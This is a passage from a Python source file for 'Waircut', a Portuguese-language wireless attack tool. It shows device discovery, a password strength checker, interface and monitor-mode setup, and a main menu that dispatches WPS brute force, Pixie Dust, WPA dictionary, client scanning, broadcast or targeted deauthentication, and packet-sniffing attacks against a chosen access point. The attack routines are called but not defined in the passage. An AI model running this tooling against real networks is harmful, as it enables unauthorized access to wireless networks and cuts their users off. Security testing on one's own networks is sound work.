                        elif 'WORKGROUP' in output or 'DOMAIN' in output:
                            device['type'] = 'Workstation'
                    except:
                        pass
        except:
            pass
    
    def identify_vendor_by_mac(self, mac):
        """Identifica fabricante pelo MAC address (OUI)"""
        oui = mac[:8].replace(':', '-')
        
        # Usa a mesma base de dados da classe AccessPoint
        ap_temp = AccessPoint("00:00:00:00:00:00", "", 0, 0)
        vendor = ap_temp.identify_manufacturer(mac)
        
        return vendor if vendor != "Desconhecido" else "Unknown"
    
    def guess_device_type(self, mac, vendor):
        """Tenta adivinhar o tipo de dispositivo baseado no fabricante"""
        vendor_lower = vendor.lower() if vendor else ""
        
        # Roteadores
        if any(x in vendor_lower for x in ['tp-link', 'd-link', 'netgear', 'asus', 'linksys', 
                                             'cisco', 'huawei', 'zte', 'fiberhome', 'sercomm']):
            return 'Router/AP'
        
        # Smartphones
        elif any(x in vendor_lower for x in ['apple', 'samsung', 'xiaomi', 'huawei', 'motorola']):
            return 'Smartphone/Tablet'
        
        # Computadores
        elif any(x in vendor_lower for x in ['dell', 'hp', 'lenovo', 'asus', 'acer', 'intel']):
            return 'Computer'
        
        # Smart TVs / Streaming
        elif any(x in vendor_lower for x in ['lg', 'sony', 'samsung', 'roku', 'amazon']):
            return 'Smart TV/Media'
        
        # IoT
        elif any(x in vendor_lower for x in ['ring', 'nest', 'philips', 'sonos']):
            return 'IoT Device'
        
        return 'Unknown'
    
    def show_network_devices(self, devices):
        """Exibe lista de dispositivos encontrados"""
        print(f"\n{Colors.CYAN}{'='*120}{Colors.RESET}")
        print(f"{Colors.BOLD}Dispositivos Encontrados na Rede{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*120}{Colors.RESET}")
        
        if not devices:
            print(f"{Colors.YELLOW}[*] Nenhum dispositivo encontrado{Colors.RESET}")
            return
        
        print(f"\n{Colors.WHITE}Total: {len(devices)} dispositivo(s){Colors.RESET}\n")
        
        # Cabeçalho
        print(f"{Colors.CYAN}{'IP':<16} {'MAC':<18} {'Hostname':<25} {'Fabricante':<15} {'Tipo':<20}{Colors.RESET}")
        print(f"{Colors.CYAN}{'-'*120}{Colors.RESET}")
        
        for device in devices:
            ip = device['ip']
            mac = device['mac'] if device['mac'] else 'N/A'
            hostname = device['hostname'][:24] if device['hostname'] else 'N/A'
            vendor = device['vendor'][:14] if device['vendor'] else 'Unknown'
            dev_type = device['type'][:19] if device['type'] else 'Unknown'
            
            # Coloriza por tipo
            color = Colors.WHITE
            if 'Router' in dev_type or 'AP' in dev_type:
                color = Colors.CYAN
            elif 'Smartphone' in dev_type or 'Tablet' in dev_type:
                color = Colors.GREEN
            elif 'Computer' in dev_type:
                color = Colors.BLUE
            elif 'IoT' in dev_type:
                color = Colors.YELLOW
            
            print(f"{color}{ip:<16} {mac:<18} {hostname:<25} {vendor:<15} {dev_type:<20}{Colors.RESET}")
        
        print(f"{Colors.CYAN}{'-'*120}{Colors.RESET}")
        
        # Estatísticas
        print(f"\n{Colors.CYAN}Estatísticas:{Colors.RESET}")
        
        # Conta por tipo
        type_count = {}
        for device in devices:
            dev_type = device['type']
            type_count[dev_type] = type_count.get(dev_type, 0) + 1
        
        for dev_type, count in sorted(type_count.items(), key=lambda x: x[1], reverse=True):
            print(f"  {dev_type:<20} {count:>3} dispositivo(s)")
        
        # Conta por fabricante
        vendor_count = {}
        for device in devices:
            vendor = device['vendor'] if device['vendor'] else 'Unknown'
            vendor_count[vendor] = vendor_count.get(vendor, 0) + 1
        
        print(f"\n{Colors.CYAN}Top Fabricantes:{Colors.RESET}")
        for vendor, count in sorted(vendor_count.items(), key=lambda x: x[1], reverse=True)[:5]:
            print(f"  {vendor:<20} {count:>3} dispositivo(s)")
    
    def password_strength_test(self):
        """Testa força de uma senha"""
        print(f"\n{Colors.CYAN}=== Teste de Força de Senha ==={Colors.RESET}")
        
        password = input(f"{Colors.YELLOW}Digite a senha para testar: {Colors.RESET}")
        
        if not password:
            print(f"{Colors.RED}Senha vazia!{Colors.RESET}")
            return
        
        score = 0
        feedback = []
        
        # Comprimento
        length = len(password)
        if length >= 12:
            score += 30
            feedback.append(f"{Colors.GREEN}✓ Comprimento bom ({length} caracteres){Colors.RESET}")
        elif length >= 8:
            score += 20
            feedback.append(f"{Colors.YELLOW}⚠ Comprimento aceitável ({length} caracteres){Colors.RESET}")
        else:
            score += 10
            feedback.append(f"{Colors.RED}✗ Senha muito curta ({length} caracteres){Colors.RESET}")
        
        # Complexidade
        has_lower = any(c.islower() for c in password)
        has_upper = any(c.isupper() for c in password)
        has_digit = any(c.isdigit() for c in password)
        has_special = any(not c.isalnum() for c in password)
        
        complexity_score = sum([has_lower, has_upper, has_digit, has_special])
        
        if complexity_score == 4:
            score += 40
            feedback.append(f"{Colors.GREEN}✓ Excelente complexidade (maiúsculas, minúsculas, números e símbolos){Colors.RESET}")
        elif complexity_score == 3:
            score += 30
            feedback.append(f"{Colors.YELLOW}⚠ Boa complexidade (3 tipos de caracteres){Colors.RESET}")
        elif complexity_score == 2:
            score += 20
            feedback.append(f"{Colors.YELLOW}⚠ Complexidade média (2 tipos de caracteres){Colors.RESET}")
        else:
            score += 10
            feedback.append(f"{Colors.RED}✗ Baixa complexidade{Colors.RESET}")
        
        # Padrões comuns
        common_patterns = ['123', 'abc', 'qwerty', 'password', 'admin', '111', '000']
        has_pattern = any(pattern in password.lower() for pattern in common_patterns)
        
        if has_pattern:
            score -= 20
            feedback.append(f"{Colors.RED}✗ Contém padrão comum{Colors.RESET}")
        else:
            score += 20
            feedback.append(f"{Colors.GREEN}✓ Sem padrões comuns detectados{Colors.RESET}")
        
        # Repetições
        if len(set(password)) < len(password) * 0.5:
            score -= 10
            feedback.append(f"{Colors.RED}✗ Muitos caracteres repetidos{Colors.RESET}")
        
        # Resultado
        print(f"\n{Colors.CYAN}Análise:{Colors.RESET}")
        for item in feedback:
            print(f"  {item}")
        
        print(f"\n{Colors.CYAN}Score: {max(0, score)}/100{Colors.RESET}")
        
        if score >= 80:
            print(f"{Colors.GREEN}Senha FORTE - Excelente!{Colors.RESET}")
        elif score >= 60:
            print(f"{Colors.YELLOW}Senha BOA - Pode melhorar{Colors.RESET}")
        elif score >= 40:
            print(f"{Colors.YELLOW}Senha MÉDIA - Recomenda-se melhorar{Colors.RESET}")
        else:
            print(f"{Colors.RED}Senha FRACA - Mude imediatamente!{Colors.RESET}")
        
        # Tempo estimado para quebrar
        import math
        charset_size = 0
        if has_lower: charset_size += 26
        if has_upper: charset_size += 26
        if has_digit: charset_size += 10
        if has_special: charset_size += 32
        
        combinations = charset_size ** length
        # Assumindo 1 bilhão de tentativas por segundo
        seconds = combinations / 1_000_000_000
        
        if seconds < 60:
            time_str = f"{seconds:.2f} segundos"
        elif seconds < 3600:
            time_str = f"{seconds/60:.2f} minutos"
        elif seconds < 86400:
            time_str = f"{seconds/3600:.2f} horas"
        elif seconds < 31536000:
            time_str = f"{seconds/86400:.2f} dias"
        else:
            time_str = f"{seconds/31536000:.2f} anos"
        
        print(f"\n{Colors.CYAN}Tempo estimado para quebrar (brute force):{Colors.RESET}")
        print(f"  {time_str} (assumindo 1 bilhão de tentativas/segundo)")

    
    def interface_menu(self):
        """Menu para selecionar interface de rede"""
        print(f"\n{Colors.CYAN}{'='*50}{Colors.RESET}")
        print(f"{Colors.BOLD}Seleção de Interface de Rede{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*50}{Colors.RESET}")
        
        try:
            if_list = []
            if os.name == 'nt':
                # Windows implementation using Scapy
                from scapy.arch.windows import get_windows_if_list
                interfaces = get_windows_if_list()
                for iface in interfaces:
                    # Filter usually useful interfaces
                    if 'Wi-Fi' in iface['name'] or 'Wireless' in iface['description'] or 'Ethernet' in iface['name']:
                        if_list.append(iface['name'])
            else:
                # Linux implementation
                # Lista interfaces disponíveis
                interfaces = subprocess.run(['iwconfig'], capture_output=True, text=True).stdout
                
                for line in interfaces.split('\n'):
                    if 'IEEE 802.11' in line:
                        iface = line.split()[0]
                        if_list.append(iface)
            
            if not if_list:
                print(f"{Colors.RED}[-] Nenhuma interface wireless encontrada.{Colors.RESET}")
                return None
            
            print(f"\n{Colors.YELLOW}Interfaces disponíveis:{Colors.RESET}")
            for i, iface in enumerate(if_list):
                print(f"  {i+1}. {iface}")
            
            try:
                choice = int(input(f"\n{Colors.YELLOW}[?] Selecione a interface (1-{len(if_list)}): {Colors.RESET}"))
                
                if 1 <= choice <= len(if_list):
                    selected = if_list[choice-1]
                    print(f"{Colors.GREEN}[+] Interface selecionada: {selected}{Colors.RESET}")
                    
                    # Verificar modo monitor
                    if not self.check_monitor_mode():
                        print(f"{Colors.YELLOW}[*] Interface não está em modo monitor.{Colors.RESET}")
                        set_monitor = input(f"{Colors.YELLOW}[?] Configurar modo monitor? (s/N): {Colors.RESET}")
                        
                        if set_monitor.lower() == 's':
                            if not self.set_monitor_mode():
                                return None
                    else:
                        print(f"{Colors.GREEN}[+] Interface já está em modo monitor{Colors.RESET}")
                    
                    return selected
                else:
                    print(f"{Colors.RED}[-] Seleção inválida.{Colors.RESET}")
                    return None
                    
            except ValueError:
                print(f"{Colors.RED}[-] Entrada inválida.{Colors.RESET}")
                return None
                
        except Exception as e:
            print(f"{Colors.RED}[-] Erro ao listar interfaces: {e}{Colors.RESET}")
            return None
    
    def main_menu(self):
        """Menu principal da aplicação"""
        while True:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
            print(f"{Colors.BOLD}Menu Principal - Waircut{Colors.RESET}")
            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
            
            print(f"\n{Colors.CYAN}[Reconhecimento]{Colors.RESET}")
            print(f"1. Escanear redes Wi-Fi")
            print(f"2. Mostrar APs encontrados")
            print(f"3. Selecionar AP para ataque")
            
            print(f"\n{Colors.CYAN}[Análise]{Colors.RESET}")
            print(f"4. Análise de Segurança da Rede (Windows OK)")
            print(f"5. Verificar Credenciais Padrão (Windows OK)")
            print(f"6. Teste de Força de Senha (Windows OK)")
            
            print(f"\n{Colors.CYAN}[Ataques WPS]{Colors.RESET}")
            print(f"7. Ataque de Brute Force WPS")
            print(f"8. Ataque Pixie Dust")
            
            print(f"\n{Colors.CYAN}[Ataques WPA/WPA2]{Colors.RESET}")
            print(f"9. Ataque de Dicionário (Simulado Windows)")
            
            print(f"\n{Colors.CYAN}[Ataques Avançados]{Colors.RESET}")
            print(f"10. Escanear clientes conectados")
            print(f"11. Ataque de Desautenticação")
            
            print(f"\n{Colors.CYAN}[Análise de Tráfego]{Colors.RESET}")
            print(f"13. Analisador de Tráfego (Estilo Wireshark)")
            print(f"14. Visualizador de Pacotes em Tempo Real")
            print(f"15. Descobrir Dispositivos na Rede (Windows OK)")
            
            print(f"\n{Colors.CYAN}[Configurações]{Colors.RESET}")
            print(f"12. Mudar interface de rede")
            print(f"0. Sair")
            
            if self.interface:
                print(f"\n{Colors.YELLOW}Interface: {self.interface}{Colors.RESET}")
            
            if self.selected_ap:
                print(f"{Colors.YELLOW}AP selecionado: {self.selected_ap.ssid} ({self.selected_ap.bssid}){Colors.RESET}")
            
            try:
                choice = input(f"\n{Colors.YELLOW}[?] Selecione uma opção: {Colors.RESET}")
                
                if choice == "1":
                    if not self.interface:
                        print(f"{Colors.RED}[-] Interface não configurada.{Colors.RESET}")
                        continue
                    
                    # Inicia thread de scan para não bloquear o menu
                    scan_thread = threading.Thread(target=self.scan_access_points)
                    scan_thread.daemon = True
                    scan_thread.start()
                    
                    input(f"{Colors.YELLOW}[*] Pressione Enter para voltar ao menu...{Colors.RESET}")
                    self.stop_event.set()
                    time.sleep(1)
                    self.stop_event.clear()
                    
                elif choice == "2":
                    self.show_ap_list()
                    
                elif choice == "3":
                    self.select_ap()
                
                elif choice == "4":
                    if not self.selected_ap:
                        print(f"{Colors.RED}[-] Nenhum AP selecionado.{Colors.RESET}")
                        continue
                    self.analyze_network_security(self.selected_ap)
                
                elif choice == "5":
                    if not self.selected_ap:
                        print(f"{Colors.RED}[-] Nenhum AP selecionado.{Colors.RESET}")
                        continue
                    self.check_default_credentials(self.selected_ap)
                
                elif choice == "6":
                    self.password_strength_test()
                    
                elif choice == "7":
                    if not self.selected_ap:
                        print(f"{Colors.RED}[-] Nenhum AP selecionado.{Colors.RESET}")
                        continue
                    
                    self.brute_force_wps(self.selected_ap)
                    
                elif choice == "8":
                    if not self.selected_ap:
                        print(f"{Colors.RED}[-] Nenhum AP selecionado.{Colors.RESET}")
                        continue
                    
                    self.pixie_dust_attack(self.selected_ap)
                
                elif choice == "9":
                    if not self.selected_ap:
                        print(f"{Colors.RED}[-] Nenhum AP selecionado.{Colors.RESET}")
                        continue
                    
                    # Ataque de dicionário
                    use_custom = input(f"{Colors.YELLOW}[?] Usar wordlist customizada? (s/N): {Colors.RESET}")
                    wordlist_path = None
                    
                    if use_custom.lower() == 's':
                        wordlist_path = input(f"{Colors.YELLOW}[?] Caminho da wordlist: {Colors.RESET}")
                    
                    self.dictionary_attack(self.selected_ap, wordlist_path)
                
                elif choice == "10":
                    if not self.selected_ap:
                        print(f"{Colors.RED}[-] Nenhum AP selecionado.{Colors.RESET}")
                        continue
                    
                    # Scan de clientes
                    duration = input(f"{Colors.YELLOW}[?] Duração do scan em segundos (padrão 30): {Colors.RESET}")
                    try:
                        duration = int(duration) if duration else 30
                    except:
                        duration = 30
                    
                    clients = self.scan_clients(self.selected_ap, duration)
                    
                    if clients:
                        print(f"\n{Colors.CYAN}Clientes encontrados:{Colors.RESET}")
                        for i, client in enumerate(clients):
                            print(f"  {i+1}. {client}")
                
                elif choice == "11":
                    if not self.selected_ap:
                        print(f"{Colors.RED}[-] Nenhum AP selecionado.{Colors.RESET}")
                        continue
                    
                    # Menu de desautenticação
                    print(f"\n{Colors.CYAN}Opções de Desautenticação:{Colors.RESET}")
                    print(f"1. Desautenticar todos os clientes (broadcast)")
                    print(f"2. Desautenticar cliente específico")
                    
                    deauth_choice = input(f"{Colors.YELLOW}[?] Escolha: {Colors.RESET}")
                    
                    client_mac = None
                    if deauth_choice == "2":
                        client_mac = input(f"{Colors.YELLOW}[?] MAC do cliente (ex: aa:bb:cc:dd:ee:ff): {Colors.RESET}")
                    
                    packet_count = input(f"{Colors.YELLOW}[?] Número de pacotes (padrão 100): {Colors.RESET}")
                    try:
                        packet_count = int(packet_count) if packet_count else 100
                    except:
                        packet_count = 100
                    
                    self.deauth_attack(self.selected_ap, client_mac, packet_count)
                
                elif choice == "12":
                    new_interface = self.interface_menu()
                    if new_interface:
                        self.interface = new_interface
                        self.selected_ap = None
                
                elif choice == "13":
                    # Analisador de tráfego
                    if not self.interface:
                        print(f"{Colors.RED}[-] Interface não configurada.{Colors.RESET}")
                        continue
                    
                    duration = input(f"{Colors.YELLOW}[?] Duração da captura em segundos (padrão 60): {Colors.RESET}")
                    try:
                        duration = int(duration) if duration else 60
                    except:
                        duration = 60
                    
                    save_pcap = input(f"{Colors.YELLOW}[?] Salvar pacotes em arquivo PCAP? (s/N): {Colors.RESET}")
                    save = save_pcap.lower() == 's'
                    
                    if self.selected_ap:
                        print(f"{Colors.YELLOW}[*] Analisando tráfego do AP: {self.selected_ap.ssid}{Colors.RESET}")
                        self.network_traffic_analyzer(self.selected_ap, duration, save)
                    else:
                        print(f"{Colors.YELLOW}[*] Analisando todo o tráfego da interface{Colors.RESET}")
                        self.network_traffic_analyzer(None, duration, save)
                
                elif choice == "14":
                    # Visualizador em tempo real
                    if not self.interface:
                        print(f"{Colors.RED}[-] Interface não configurada.{Colors.RESET}")
                        continue
                    
                    print(f"\n{Colors.CYAN}Filtros disponíveis:{Colors.RESET}")
                    print(f"  HTTP, HTTPS, DNS, TCP, UDP, SSH, FTP, ICMP, ARP")
                    print(f"  (deixe vazio para ver todos)")
                    
                    filter_proto = input(f"{Colors.YELLOW}[?] Filtrar por protocolo: {Colors.RESET}")
                    
                    duration = input(f"{Colors.YELLOW}[?] Duração em segundos (padrão 30): {Colors.RESET}")
                    try:
                        duration = int(duration) if duration else 30
                    except:
                        duration = 30
                    
                    self.live_packet_viewer(filter_proto if filter_proto else None, duration)
                
                elif choice == "15":
                    # Descoberta de dispositivos na rede
                    custom_network = input(f"{Colors.YELLOW}[?] Digite a rede (deixe vazio para auto-detectar): {Colors.RESET}")
                    network = custom_network if custom_network else None
                    
                    self.discover_network_devices(network)
                    
                elif choice == "0":
                    print(f"{Colors.YELLOW}[*] Saindo...{Colors.RESET}")
                    break
                    
                else:
                    print(f"{Colors.RED}[-] Opção inválida.{Colors.RESET}")
                    
            except ValueError:
                print(f"{Colors.RED}[-] Entrada inválida.{Colors.RESET}")
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[*] Interrompido pelo usuário.{Colors.RESET}")
                break

# Função principal
def main():
    # Verificar se é root
    # Verificar se é admin/root de forma compatível com Windows e Linux
    def is_admin():
        try:
            return os.getuid() == 0
        except AttributeError:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0

    if not is_admin():
        print(f"{Colors.RED}[-] Esta ferramenta requer privilégios de administrador/root.{Colors.RESET}")
        if os.name == 'nt':
             print(f"{Colors.YELLOW}[*] Execute o prompt de comando ou terminal como Administrador.{Colors.RESET}")
        else:
             print(f"{Colors.YELLOW}[*] Execute com: sudo python waircut.py{Colors.RESET}")
        sys.exit(1)
    
    show_banner()
    
    # Criar instância da ferramenta
    tool = Waircut()
    
    # Selecionar interface
    tool.interface = tool.interface_menu()
    
    if not tool.interface:
        print(f"{Colors.RED}[-] Interface não selecionada. Saindo...{Colors.RESET}")
        sys.exit(1)
    
    # Iniciar menu principal
    tool.main_menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[*] Programa encerrado pelo usuário.{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}[-] Erro fatal: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)